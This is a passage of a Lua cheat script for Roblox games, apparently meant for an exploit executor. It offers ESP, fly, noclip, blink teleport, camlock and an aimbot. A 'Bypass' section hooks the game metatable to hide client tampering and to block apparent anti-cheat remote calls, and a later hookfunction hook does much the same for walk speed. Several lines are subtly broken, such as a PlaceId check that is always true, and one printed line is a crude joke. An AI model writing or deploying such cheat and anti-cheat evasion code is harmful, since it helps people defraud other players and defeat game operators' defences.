getgenv().EspPlayer = function(Dude)
	local bgui = Instance.new("BillboardGui", Dude.Character.Head)
	local tlabel = Instance.new("TextLabel", bgui)

	bgui.Name = "ESP"
	bgui.Adornee = part
	bgui.AlwaysOnTop = true
	bgui.ExtentsOffset = Vector3.new(0, 3, 0)
	bgui.Size = UDim2.new(0, 5, 0, 5)
	bgui.ResetOnSpawn = false

	tlabel.Name = "espTarget"
	tlabel.BackgroundColor3 = Color3.new(170, 0, 0)
	tlabel.BackgroundTransparency = 1
	tlabel.BorderSizePixel = 0
	tlabel.Position = UDim2.new(0, 0, 0, -30)
	tlabel.Size = UDim2.new(1, 0, 7, 0)
	tlabel.Visible = true
	tlabel.ZIndex = 10
	tlabel.Font = "ArialBold"
	tlabel.FontSize = "Size18"
	RService.RenderStepped:Connect(function()
		if Dude and Dude.Character and Dude.Character:FindFirstChildOfClass("Humanoid") then 
			tlabel.Text = Dude.Name.." ["..math.floor(Dude.Character.Humanoid.Health).."/"..math.floor(Dude.Character.Humanoid.MaxHealth).."]".." ["..math.floor(Dude:DistanceFromCharacter(Client.Character.Head.Position)).."]"
		end
	end)
	tlabel.TextColor = BrickColor.new("Red") 
	tlabel.TextStrokeTransparency = 0.5
end

getgenv().togglefly = function()
	Flying = not Flying
	Notify("covax", "Flying: "..tostring(Flying), "", 3)
	local T = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
	local BV, BG = INew("BodyVelocity", T), INew("BodyGyro", T)
	BV.Velocity = Vec3(0, 0.1, 0);BV.MaxForce = Vec3(math.huge, math.huge, math.huge)
	BG.CFrame = T.CFrame;BG.P = 9e9;BG.MaxTorque = Vec3(9e9, 9e9, 9e9)
	local FlyPart = INew("Part", workspace)
	FlyPart.Anchored = true;FlyPart.Size = Vec3(6, 1, 6);FlyPart.Transparency = 1 

	while Flying == true and Client and Client.Character and Client.Character:FindFirstChild("Humanoid") and Client.Character.Humanoid.Health ~= 0 and RService.Heartbeat:Wait() and T do 
		local Front, Back, Left, Right = 0, 0, 0, 0
		if KeysTable["W"] == true then 
			Front = Flyspeed 
		elseif not KeysTable["W"] == true then
			Front = 0 
		end
		if KeysTable["A"] == true then 
			Right = -Flyspeed
		elseif not KeysTable["A"] == true then 
			Right = 0 
		end
		if KeysTable["S"] == true then 
			Back = -Flyspeed 
		elseif not KeysTable["S"] == true then 
			Back = 0
		end
		if KeysTable["D"] == true then 
			Left = Flyspeed
		elseif not KeysTable["D"] == true then 
			Left = 0
		end
		if tonumber(Front + Back) ~= 0 or tonumber(Left + Right) ~= 0 then 
			BV.Velocity = ((Camera.CoordinateFrame.lookVector * (Front + Back)) + ((Camera.CoordinateFrame * CF(Left + Right, (Front + Back) * 0.2, 0).p) - Camera.CoordinateFrame.p)) * 50
		else 
			BV.Velocity = Vec3(0, 0.1, 0)
		end
		BG.CFrame = Camera.CoordinateFrame
	end
	FlyPart:Destroy();BG:Remove();BV:Remove()
end

Uis.InputBegan:Connect(function(Key)
	if not (Uis:GetFocusedTextBox()) then
		if Key.KeyCode == Enum.KeyCode.W then 
			KeysTable["W"] = true 
		end 
		if Key.KeyCode == Enum.KeyCode.A then 
			KeysTable["A"] = true 
		end
		if Key.KeyCode == Enum.KeyCode.S then 
			KeysTable["S"] = true 
		end
		if Key.KeyCode == Enum.KeyCode.D then 
			KeysTable["D"] = true 
		end
		if Key.KeyCode == Enum.KeyCode.F then 
			if FirstFly == true then 
				Notify("covax", "You can now fly, like a bird.", "", 3)
				FirstFly = false 
			end
			togglefly()
		end
		if Key.KeyCode == Enum.KeyCode.X then 
			Noclip = not Noclip 
			Notify("covax", "Noclip: "..tostring(Noclip), "", 3)
		end
		if Key.KeyCode == Enum.KeyCode.LeftShift then
			KeysTable["LeftShift"] = true
			while Blink == true and KeysTable["LeftShift"] == true and Client and Client.Character and RService.Heartbeat:Wait() do
				local ClientRF = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
				local Hum = Client.Character:FindFirstChild("Humanoid")
				ClientRF.CFrame = ClientRF.CFrame + Vec3(Hum.MoveDirection.X * Blinkspeed, Hum.MoveDirection.Y * Blinkspeed, Hum.MoveDirection.Z * Blinkspeed)
			end 
		end
	end
end)
Uis.InputEnded:Connect(function(Key --[[Typing]])
	if not (Uis:GetFocusedTextBox()) then
		if Key.KeyCode == Enum.KeyCode.W then 
			KeysTable["W"] = false 
		end
		if Key.KeyCode == Enum.KeyCode.A then 
			KeysTable["A"] = false 
		end
		if Key.KeyCode == Enum.KeyCode.S then 
			KeysTable["S"] = false 
		end
		if Key.KeyCode == Enum.KeyCode.D then 
			KeysTable["D"] = false
		end
		if Key.KeyCode == Enum.KeyCode.LeftShift then
			KeysTable["LeftShift"] = false
		end
	end
end)

-- [[ Bypass ]] --
local rm = getrawmetatable(game) or debug.getrawmetatable(game) or getmetatable(game)
if setreadonly then setreadonly(rm, false) else make_writeable(rm, true) end
local caller, cscript = checkcaller or is_protosmasher_caller, getcallingscript or get_calling_script;
local rindex, nindex, ncall, closure = rm.__index, rm.__newindex, rm.__namecall, newcclosure or read_me;

rm.__newindex = closure(function(self, Meme, Val)
	if caller() then return nindex(self, Meme, Val) end 
	if game.PlaceId ~= (StreetsID) then 
		if Meme == "WalkSpeed" then 
			return 16
		end
		if Meme == "JumpPower" then 
			return 37.5 
		end
		if Meme == "HipHeight" then 
			return 0 
		end
		if Meme == "Health" then 
			return 100 
		end
	end
	if self:IsDescendantOf(Client.Character) and self.Name == "HumanoidRootPart" or self.Name == "Torso" then 
		if Meme == "CFrame" or Meme == "Position" or Meme == "Anchored" then 
			return nil 
		end
	end
	return nindex(self, Meme, Val) 
end)
rm.__namecall = closure(function(self, ...)
	local Args, Method = {...}, getnamecallmethod() or get_namecall_method();
	if Method == "BreakJoints" then 
		return wait(9e9)
	end
	if game.PlaceId ~= (StreetsID) then
		if Method == "FireServer" and not self.Name == "SayMessageRequest" then
			if tostring(self.Parent) == "ReplicatedStorage" or self.Name == "lIII" then 
				return wait(9e9) 
			end
			if Args[1] == "hey" then 
				return wait(9e9) 
			end
		end
		if Method == "FireServer" and self.Name == "Fire" and AimbotTarget ~= nil and Aimbot == true  then
			return ncall(self, AimbotTarget.Character[AimPart].CFrame + AimbotTarget.Character[AimPart].Velocity/Aimvelocity)
		end
	end
	if game.PlaceId == (StreetsID) then
		if Method == "FireServer" and Args[1] == "WalkSpeed" or Args[1] == "JumpPower" or Args[1] == "HipHeight" then 
			return nil 
		end
		if Method == "FireServer" and self.Name == "Input" then 
			if Args[1] == "bv" or Args[1] == "hb" or Args[1] == "ws" then 
				return wait(9e9)
			end
		end
		if Method == "FireServer" and self.Name == "Input" and AimbotTarget ~= nil and Aimbot == true then 
			Args[2].mousehit = AimbotTarget.Character[AimPart].CFrame + AimbotTarget.Character[AimPart].Velocity/Aimvelocity 
			Args[2].velo = math.huge
			return ncall(self, unpack(Args))
		end
	end
	return ncall(self, unpack(Args))
end)
if setreadonly then setreadonly(rm, true) else make_writeable(rm, false) end

-- [[ CharacterAdded/Died ]] --
Client.Character.Humanoid.Died:Connect(function()
	if Flying then togglefly() end
end)
Client.CharacterAdded:Connect(function()
	repeat wait() until Client.Character:FindFirstChild("Humanoid")
	Client.Character.Humanoid.Died:Connect(function()
		if Flying then togglefly() end
	end)
end)

-- [[ Commands ]] --
Commands["Play a Song"] = {
	["Aliases"] = {"pl", "play", "playsong", "ps", "song"};
	["Function"] = function(Args)
		if Args[1] then 
			local Radio = Client.Backpack:FindFirstChild("BoomBox")
			if Radio then 
				Radio.Parent = Client.Character
				Radio.RemoteEvent:FireServer("play", tonumber(Args[1]))
			end
			Notify("covax", "Audio: "..tonumber(Args[1]), "", 3)
		end
	end
}
Commands["Go AFK"] = {
	["Aliases"] = {"afk", "brb"};
	["Function"] = function(Args)
		AFK = not AFK
		if (not AFK) then return end
		spawn(function()
			while AFK do
				wait(0.5)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(AFKMessage, "All")
			end
		end)
	end
}
Commands["Sets your Flyspeed"] = {
	["Aliases"] = {"flyspeed", "fs"};
	["Function"] = function(Args)
		if Args[1] then 
			Flyspeed = tonumber(Args[1])
			Notify("covax", "Flyspeed: "..tonumber(Flyspeed), "", 3)
		end
	end
}
Commands["Toggles Fly"] = {
	["Aliases"] = {"fly", "togglefly"};
	["Function"] = function(Args)
		togglefly()
	end
}
Commands["Sets your Chat Command Prefix"] = {
	["Aliases"] = {"prefix", "pfix"};
	["Function"] = function(Args)
		if Args[1] then 
			Prefix = Args[1]
		end
		Notify("covax", "Prefix: "..tostring(Prefix), "", 3)
	end
}
Commands["Sets your FieldOfView"] = {
	["Aliases"] = {"fieldofview", "fov"};
	["Function"] = function(Args)
		if Args[1] then 
			Camera.FieldOfView = tonumber(Args[1])
		end
		Notify("covax", "FieldOfView: "..tonumber(Args[1]), "", 3)
	end
}
Commands["Toggles Blink"] = {
	["Aliases"] = {"blink", "blinkspd"};
	["Function"] = function(Args)
		Blink = not Blink 
		Notify("covax", "Blink: "..tostring(Blink), "", 3)
	end
}
Commands["Esp a Player"] = {
	["Aliases"] = {"esp", "find"};
	["Function"] = function(Args)
		if Args[1] then
			EspTarget = SearchPlayers(Args[1])
			if EspTarget then
				EspPlayer(EspTarget)
			end
		end
		Notify("covax", "Esp Target: "..tostring(EspTarget), "", 3)
	end
}
Commands["UnEsp Esp'd Player"] = {
	["Aliases"] = {"unesp", "unfind"};
	["Function"] = function(Args)
		if Args[1] then 
			local UnEspPlayer;UnEspPlayer = SearchPlayers(Args[1])
			if UnEspPlayer then 
				for _, v in next, UnEspPlayer.Character:GetDescendants() do 
					if v:IsA("BillboardGui") or v:IsA("TextLabel") then 
						v:Destroy() --[[if staircase(s) go brrrRRR]]
					end
				end
			end
		end
	end
}
Commands["Rejoins Current Game"] = {
	["Aliases"] = {"rejoin"};
	["Function"] = function()
		TPService:Teleport(game.PlaceId, Client)
	end
}
Commands["Resets Your Character"] = {
	["Aliases"] = {"r", "reset", "re", "res"};
	["Function"] = function()
		ResetCharacter()
	end
}
Commands["Sets Camlock Target"] = {
	["Aliases"] = {"camlock", "cam", "cl", "cml"};
	["Function"] = function(Args)
		if Args[1] then 
			CamlockTarget = SearchPlayers(Args[1]);Camlock = true
		end
		Notify("covax", "Camlock Target: "..tostring(CamlockTarget), "", 3)
	end
}
Commands["UnCamlocks Camlocked Target"] = {
	["Aliases"] = {"uncamlock", "uncam", "uncl", "uncml"};
	["Function"] = function()
		CamlockTarget = nil;Camlock = false 
		Notify("covax", "Camlock: "..tostring(Camlock), "", 3)
	end
}
Commands["Sets Aimbot Target"] = {
	["Aliases"] = {"aim", "s", "aimbot", "shoot"};
	["Function"] = function(Args)
		if Args[1] then 
			AimbotTarget = SearchPlayers(Args[1]);Aimbot = true
		end
		Notify("covax", "Aimbot Target: "..tostring(AimbotTarget), "", 3)
	end
}
Commands["UnAimbots Aimbotted Target"] = {
	["Aliases"] = {"unaim", "uns", "unaimbot", "unshoot"};
	["Function"] = function()
		AimbotTarget = nil;Aimbot = false
		Notify("covax", "Aimbot: "..tostring(Aimbot), "", 3)
	end
}
Commands["View a Player"] = {
	["Aliases"] = {"view"};
	["Function"] = function(Args)
		if Args[1] then 
			ViewTarget = SearchPlayers(Args[1]);Viewing = true 
		end
		Notify("covax", "View Target: "..tostring(ViewTarget), "", 3)
	end
}
Commands["UnView Viewed Target"] = {
	["Aliases"] = {"unview"};
	["Function"] = function()
		ViewTarget = nil;Viewing = false
		Camera.CameraSubject = Client.Character
		Notify("covax", "Viewing: "..tostring(Viewing), "", 3)
	end
}
Commands["Sets Aimvelocity"] = {
	["Aliases"] = {"aimvelocity"};
	["Function"] = function(Args)
		if Args[1] then 
			Aimvelocity = tonumber(Args[1])
		end
		Notify("covax", "Aimvelocity: "..tonumber(Args[1]), "", 3)
	end
}
Commands["Toggles Noclip"] = {
	["Aliases"] = {"noclip", "nc", "nclip"};
	["Function"] = function()
		Noclip = not Noclip 
		Notify("covax", "Noclip: "..tostring(Noclip), "", 3)
	end
}
Commands["Sets Blinkspeed"] = {
	["Aliases"] = {"bs", "blinkspeed"};
	["Function"] = function(Args)
		if Args[1] then 
			Blinkspeed = tonumber(Args[1])
		end
		Notify("covax", "Blinkspeed: "..tonumber(Args[1]), "", 3)
	end
}
Commands["Sets Aimbot Part"] = {
	["Aliases"] = {"aimpart"};
	["Function"] = function(Args)
		AimPart = Args[1]
		if AimPartTable[Args[1]] then 
			AimPart = AimPartTable[Args[1]] 
		end
		Notify("covax", "AimPart: "..tostring(AimPart), "", 3)
	end
}
Commands["Removes Chairs"] = {
	["Aliases"] = {"removechair", "rc"};
	["Function"] = function()
		for _, v in next, workspace:GetChildren() do 
			if v:IsA("Seat") then 
				v:Destroy()
			end
		end
	end
}


RService.Stepped:Connect(function()
	if Camlock == true and CamlockTarget and CamlockTarget.Character and CamlockTarget.Character:FindFirstChild(CamPart) then 
		Camera.CoordinateFrame = CF(Camera.CoordinateFrame.p, CF(CamlockTarget.Character[CamPart].Position).p)
	end
	if Noclip == true then 
		for i = 1, #Client.Character:GetChildren() do
			local CG = Client.Character:GetChildren()[i]
			if CG:IsA("BasePart") then 
				CG.CanCollide = false 
			end
		end
		pcall(function()
			if Client and Client.Backpack then 
				Client.Backpack:FindFirstChild("Glock").Barrel.CanCollide = false 
			else
				Client.Character:FindFirstChild("Glock").Barrel.CanCollide = false
			end
		end)
	end
	if Viewing == true and ViewTarget ~= nil then 
		Camera.CameraSubject = ViewTarget.Character
	end
	if Flying and Client.Character then
		if Client.Character and Client.Character:FindFirstChild("Humanoid") then
			RService.Heartbeat:Wait()
			Client.Character.Humanoid.PlatformStand = false;Client.Character.Humanoid.Sit = false
			Client.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
		end
	end
	if Client.Character:FindFirstChild("FlyPart") then
		Client.Character:FindFirstChild("FlyPart").CFrame = Client.Character.HumanoidRootPart.CFrame * CF(0, -3.5, 0)
	end
end)

print([[

got the source for a dick pic :smirk:
=======

-------
Toggles = Turns On and Off
Alt = Other names for the Command
-------

Keybinds:

F - Toggles Fly 
X - Toggles Noclip
; - Toggles Command Bar
=======

(Names can be Shortened/Not-Capitalized)
Commands:

[1]: pl <id here>, Plays that song in your Radio (Alt: play, playsong, ps, song)
[2]: afk, Toggles Anti-Afk (Alt: brb)
[3]: flyspeed <number here>, Sets your FlySpeed (Alt: fs)
[4]: fly, Toggles Fly (Alt: togglefly)
[5]: prefix <letter or whatever here>, Sets your Chat Command Prefix (Alt: pfix)
[6]: fieldofview <number here>, Sets your FieldOfView (Alt: fov, f)
[7]: blink, Toggles Blink (Alt: blinkspd)
[8]: esp <name here>, Sets ESP Target 
[9]: unesp <name here>, UnEsp's ESP'd Target 
[10]: rejoin, Rejoins the Current Game 
[11]: r, Resets your Character (Alt: reset, re, res)
[12]: camlock <name here>, Sets Camlock Target (Alt: cam, cl, cml)
[13]: uncamlock, UnCamlocks Camlocked Target (Alt: uncam, uncl, uncml)
[14]: aimbot <name here>, Sets Aimbot Target (Alt: s, aim, shoot) (Press LeftClick/Mouse1 to Aimbot them)
[15]: unaimbot, UnAimbots Aimbot Target (Alt: uns, unaim, unshoot)
[16]: view <name here>, Sets View Target 
[17]: unview, UnViews Viewed Target 
[18]: aimvelocity <number here>, Sets Aimvelocity 
[19]: noclip, Toggles Noclip 
[20]: blinkspeed <number here>, Sets Blinkspeed (Alt: bs)
[21]: aimpart <torso or head>, Sets the Part in which Aimbot shoots at
[22]: removechair, Removes Chairs in the workspace (Alt: rc)

]])

Client.Chatted:Connect(RunCommand)
Notify("covax", "Took "..string.format("%.3f", tick() - LoadingTime).." f9 for cmds", "" , 3)
-- credits to unknown X
local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local HealthInfo = Instance.new("TextLabel")
local WalkSpeedtxt = Instance.new("TextLabel")
local WsInfo = Instance.new("TextLabel")
local Healthtxt = Instance.new("TextLabel")
local StanInfo = Instance.new("TextLabel")
local StanTxt = Instance.new("TextLabel")
local ToolsInfo = Instance.new("TextLabel")
local Toolstxt = Instance.new("TextLabel")
local lp = game:GetService("Players").LocalPlayer
local p = game:GetService("Players")
local hum = lp.Character.Humanoid
local info = true or false
info = true
local m = lp:GetMouse()
ScreenGui.Parent = game.CoreGui
TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
TextLabel.BorderColor3 = Color3.new(0.129412, 0.129412, 0.129412)
TextLabel.Position = UDim2.new(0, 0, 0.537848592, 0)
TextLabel.Size = UDim2.new(0, 160, 0, 12)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "Player Info"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 14
Frame.Parent = TextLabel
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.BackgroundTransparency = 0.40000000596046
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 1, 0)
Frame.Size = UDim2.new(0, 160, 0, 100)
HealthInfo.Name = "HealthInfo"
HealthInfo.Parent = Frame
HealthInfo.BackgroundColor3 = Color3.new(1, 1, 1)
HealthInfo.BackgroundTransparency = 1
HealthInfo.Position = UDim2.new(-0.000946760178, 0, 0.0700000077, 0)
HealthInfo.Size = UDim2.new(0, 47, 0, 21)
HealthInfo.Font = Enum.Font.Code
HealthInfo.Text = "Health:"
HealthInfo.TextColor3 = Color3.new(1, 1, 1)
HealthInfo.TextSize = 14
WalkSpeedtxt.Name = "WalkSpeedtxt"
WalkSpeedtxt.Parent = Frame
WalkSpeedtxt.BackgroundColor3 = Color3.new(1, 1, 1)
WalkSpeedtxt.BackgroundTransparency = 1
WalkSpeedtxt.Position = UDim2.new(0.455303222, 0, 0.279999971, 0)
WalkSpeedtxt.Size = UDim2.new(0, 30, 0, 21)
WalkSpeedtxt.Font = Enum.Font.Code
WalkSpeedtxt.Text = ""
WalkSpeedtxt.TextColor3 = Color3.new(255, 0, 0)
WalkSpeedtxt.TextSize = 14
WsInfo.Name = "WsInfo"
WsInfo.Parent = Frame
WsInfo.BackgroundColor3 = Color3.new(1, 1, 1)
WsInfo.BackgroundTransparency = 1
WsInfo.Position = UDim2.new(0.0740532428, 0, 0.279999971, 0)
WsInfo.Size = UDim2.new(0, 47, 0, 21)
WsInfo.Font = Enum.Font.Code
WsInfo.Text = "WalkSpeed:"
WsInfo.TextColor3 = Color3.new(1, 1, 1)
WsInfo.TextSize = 14
Healthtxt.Name = "Healthtxt"
Healthtxt.Parent = Frame
Healthtxt.BackgroundColor3 = Color3.new(1, 1, 1)
Healthtxt.BackgroundTransparency = 1
Healthtxt.Position = UDim2.new(0.505303204, 0, 0.0700000003, 0)
Healthtxt.Size = UDim2.new(0, 40, 0, 21)
Healthtxt.Font = Enum.Font.Code
Healthtxt.Text = ""
Healthtxt.TextColor3 = Color3.new(255, 0, 0)
Healthtxt.TextSize = 12
StanInfo.Name = "StanInfo"
StanInfo.Parent = Frame
StanInfo.BackgroundColor3 = Color3.new(1, 1, 1)
StanInfo.BackgroundTransparency = 1
StanInfo.Position = UDim2.new(-0.000946760178, 0, 0.49000001, 0)
StanInfo.Size = UDim2.new(0, 59, 0, 21)
StanInfo.Font = Enum.Font.Code
StanInfo.Text = "Stamina:"
StanInfo.TextColor3 = Color3.new(1, 1, 1)
StanInfo.TextSize = 14
StanTxt.Name = "StanTxt"
StanTxt.Parent = Frame
StanTxt.BackgroundColor3 = Color3.new(1, 1, 1)
StanTxt.BackgroundTransparency = 1
StanTxt.Position = UDim2.new(0.62405324, 0, 0.48999995, 0)
StanTxt.Size = UDim2.new(0, 30, 0, 21)
StanTxt.Font = Enum.Font.Code
StanTxt.Text = ""
StanTxt.TextColor3 = Color3.new(255, 0, 0)
StanTxt.TextSize = 14
ToolsInfo.Name = "ToolsInfo"
ToolsInfo.Parent = Frame
ToolsInfo.BackgroundColor3 = Color3.new(1, 1, 1)
ToolsInfo.BackgroundTransparency = 1
ToolsInfo.Position = UDim2.new(-0.0134467632, 0, 0.699999988, 0)
ToolsInfo.Size = UDim2.new(0, 103,0, 21)
ToolsInfo.Font = Enum.Font.Code
ToolsInfo.Text = "Equipped Tool:"
ToolsInfo.TextColor3 = Color3.new(1, 1, 1)
ToolsInfo.TextSize = 14
Toolstxt.Name = "Toolstxt"
Toolstxt.Parent = Frame
Toolstxt.BackgroundColor3 = Color3.new(1, 1, 1)
Toolstxt.BackgroundTransparency = 1
Toolstxt.Position = UDim2.new(0.687, 0,0.7, 0)
Toolstxt.Size = UDim2.new(0, 30, 0, 21)
Toolstxt.Font = Enum.Font.Code
Toolstxt.Text = ""
Toolstxt.TextColor3 = Color3.new(255, 0, 0)
Toolstxt.TextSize = 14
if info == true and not info == false then
	m.Button1Down:connect(function()
	if m.Target or m.Target.Parent then
		local plr = p:GetPlayerFromCharacter(m.Target.Parent)
		local name = plr.Name
		if plr ~= nil then
			local tools = plr.Backpack
			TextLabel.Text = "Info("..name..")"
			repeat
				wait()
				if TextLabel.Text == "Info("..name..")" then
					TextLabel.Text = "Info("..name..")"
				else
					plr = nil
				end
				Healthtxt.Text = plr.Character.Humanoid.Health
				WalkSpeedtxt.Text = plr.Character.Humanoid.WalkSpeed
				StanTxt.Text = plr.Backpack.ServerTraits.Stann.Value
				for _,x in pairs(plr.Character:GetChildren()) do
					if x:IsA("Tool") then
						Toolstxt.Text = x.Name
					else
						Toolstxt.Text = ""
					end
				end
			until info == false 
		end
	end
	end)
end
-- end of that script lol

-- zoom inf 
game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
-- end of zoom inf



-- walkshoot 
if game.PlaceId == 4669040 or 455366377 then
local mt = getrawmetatable(game)
local backup
backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
if key == "WalkSpeed" and value < 16 then
value = 16
end
return backup(self, key, value)
end))
end
--end of walkshoot
-- credits to citizen or some shit
				    
				    
